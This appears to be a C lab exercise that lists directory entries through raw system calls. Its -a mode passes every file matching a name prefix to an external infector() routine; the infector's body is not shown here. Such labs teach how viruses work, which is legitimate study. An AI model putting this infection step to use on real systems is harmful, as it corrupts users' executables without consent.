#include "util.h"
#define EXIT 1
#define STDOUT 1
#define STDERR 2
#define BUF_SIZE 8192
#define OPEN 5
#define GETDENTS 141
#define WRITE 4
#define CLOSE 6

int bugmod = 0;
int prePfixmod = 0;
int preAfixmod = 0;

extern void code_end();
extern void code_start();

enum
{
    DT_UNKNOWN = 0,
#define DT_UNKNOWN DT_UNKNOWN
    DT_FIFO = 1,
#define DT_FIFO DT_FIFO
    DT_CHR = 2,
#define DT_CHR DT_CHR
    DT_DIR = 4,
#define DT_DIR DT_DIR
    DT_BLK = 6,
#define DT_BLK DT_BLK
    DT_REG = 8,
#define DT_REG DT_REG
    DT_LNK = 10,
#define DT_LNK DT_LNK
    DT_SOCK = 12,
#define DT_SOCK DT_SOCK
    DT_WHT = 14
#define DT_WHT DT_WHT
};

char *findType(char c)
{
    switch (c)
    {
        case DT_BLK:
            return "block device";
        case DT_CHR:
            return "character device";
        case DT_DIR:
            return "directory";
        case DT_FIFO:
            return "pipe";
        case DT_LNK:
            return "symbolic link";
        case DT_REG:
            return "regular file";
        case DT_SOCK:
            return "domain socket";
        case DT_UNKNOWN:
            return "unknow";
        default:
            return "";
    }
}
void printBug(int Id, int returnValue)
{
    char *callId = "The system call ID is: ";
    char *value = "The system call value is: ";
    char *nextLine = "\n";

    system_call(WRITE, STDERR, callId, strlen(callId));
    system_call(WRITE, STDERR, itoa(Id), strlen(itoa(Id)));
    system_call(WRITE, STDERR, nextLine, strlen(nextLine));
    system_call(WRITE, STDERR, value, strlen(value));
    system_call(WRITE, STDERR, itoa(returnValue), strlen(itoa(returnValue)));
    system_call(WRITE, STDERR, nextLine, strlen(nextLine));
}
void printPath(char *path)
{
    char *input = "The  path is: ";
    char *nextLine = "\n";

    system_call(WRITE, STDERR, input, strlen(input));
    system_call(WRITE, STDERR, path, strlen(input));
    system_call(WRITE, STDERR, nextLine, strlen(nextLine));
}

void printArgsSystemCall(int id, int fd, char *str, int size)
{
    char *theArgs = "the args are: ";
    char *nextLine = "\n";
    char *tab = "\t";

    system_call(WRITE, STDERR, theArgs, strlen(theArgs));
    system_call(WRITE, STDERR, itoa(id), strlen(itoa(id)));
    system_call(WRITE, STDERR, tab, strlen(tab));
    system_call(WRITE, STDERR, itoa(fd), strlen(itoa(fd)));
    system_call(WRITE, STDERR, tab, strlen(tab));
    system_call(WRITE, STDERR, str, strlen(str));
    system_call(WRITE, STDERR, tab, strlen(tab));
    system_call(WRITE, STDERR, itoa(size), strlen(itoa(size)));
    system_call(WRITE, STDERR, nextLine, strlen(nextLine));
}

void printLengthNameDirent(int length, char *name)
{
    char *Thelength = "The length of the record is: ";
    char *nameOfRecord = "The name of the record is: ";
    char *nextLine = "\n";

    system_call(WRITE, STDERR, Thelength, strlen(Thelength));
    system_call(WRITE, STDERR, itoa(length), strlen(itoa(length)));
    system_call(WRITE, STDERR, nextLine, strlen(nextLine));
    system_call(WRITE, STDERR, nameOfRecord, strlen(nameOfRecord));
    system_call(WRITE, STDERR, name, strlen(name));
    system_call(WRITE, STDERR, nextLine, strlen(nextLine));
}

void printPrefix(char *fileName, char *prefix, char type)
{
    char *strType = findType(type);
    if (strncmp(fileName, prefix, strlen(prefix)) == 0)
    {
        ReadOrWriteOrGetdents(WRITE, STDOUT, fileName, strlen(fileName));
        char *theType = "The type file is: ";
        system_call(WRITE, STDOUT, theType, strlen(theType));
        ReadOrWriteOrGetdents(WRITE, STDOUT, strType, strlen(strType));
    }
}
void infectorFunc(char *fileName, char *prefix)
{
    if (strncmp(fileName, prefix, strlen(prefix)) == 0)
    {
        infector(fileName);
    }
}

int isBugModeOn(int argc, char **argv)
{
    char *bugMode = "-D";
    int i = 1;
    for (i; i < argc; i++)
    {
        if (strcmp(argv[i], bugMode) == 0)
        {
            return 1;
        }
    }
    return 0;
}

int FindPrefixA(int argc, char **argv)
{
    char *prefixOn = "-a";
    int i = 1;
    for (i; i < argc; i++)
    {
        if (strncmp(argv[i], prefixOn, strlen(prefixOn)) == 0)
        {
            return 1;
        }
    }
    return 0;
}

int FindPrefix(int argc, char **argv)
{
    char *prefixOn = "-p";
    int i = 1;
    for (i; i < argc; i++)
    {
        if (strncmp(argv[i], prefixOn, strlen(prefixOn)) == 0)
        {
            return 1;
        }
    }
    return 0;
}

int ReadOrWriteOrGetdents(int Id, int fd, char *buffer, int count)
{
    char *nextLine = "\n";
    int returnValue = system_call(Id, fd, buffer, count);

    if (bugmod)
    {
        printBug(Id, returnValue);
        printArgsSystemCall(Id, fd, buffer, count);
    }

    if (Id == WRITE)
    {
        system_call(WRITE, STDOUT, nextLine, strlen(nextLine));
    }
    
    return returnValue;
}

typedef struct myStruc
{
    int inode;
    int offset;
    short len;
    char name[1];
} myStruc;



int main(int argc, char *argv[], char *envp[])
{
    /*ReadOrWriteOrGetdents(WRITE, STDOUT, itoa(code_end), strlen(itoa(code_end)));
    /*ReadOrWriteOrGetdents(WRITE, STDOUT, itoa(code_start), strlen(itoa(code_start)));
    int sub = code_end - code_start;
    /*ReadOrWriteOrGetdents(WRITE, STDOUT, itoa(sub), strlen(itoa(sub)));*/
    char type;
    char *prefix;
    bugmod = isBugModeOn(argc, argv);
    prePfixmod = FindPrefix(argc, argv);
    preAfixmod = FindPrefixA(argc, argv);
    if (prePfixmod)
    {
        prefix = argv[prePfixmod] + 2;
    }

    if (preAfixmod)
    {
        prefix = argv[preAfixmod] + 2;
    }

    char buf[BUF_SIZE];
    myStruc *ent = buf;
    int fd = system_call(OPEN, ".", 0, 0);
    char *name;
    if (bugmod)
    {
        char *comment = "need to print the path";
    }
    /*ReadOrWriteOrGetdents(WRITE,STDOUT,"Flame 2 strikes!",strlen("Flame 2 strikes!"));*/
    int nread;
    while (1)
    {

        nread = ReadOrWriteOrGetdents(GETDENTS, fd, buf, BUF_SIZE);
        if (nread < 0)
        {
            ReadOrWriteOrGetdents(WRITE, STDERR, "Error in Getdents\n", strlen("Error in Getdents\n"));
            system_call(EXIT, 0x55);
        }

        if (nread == 0)
        {
            break;
        }

        int i = 0;
        while (i < nread)
        {
            ent = (buf + i);
            int length = ent->len;
            name = ent->name;
            int sizeOfName = length - 2 * (sizeof(int)) - sizeof(short);
            type = *(buf + i + ent->len - 1);
            if (prePfixmod)
            {
                printPrefix(name, prefix, type);
            }
            else if (preAfixmod)
            {
                printPrefix(name, prefix, type);
                infectorFunc(name, prefix);
            }
            else
            {
                ReadOrWriteOrGetdents(WRITE, STDOUT, name, sizeOfName);
            }

            i += ent->len;
        }
    }

    system_call(CLOSE, fd);
}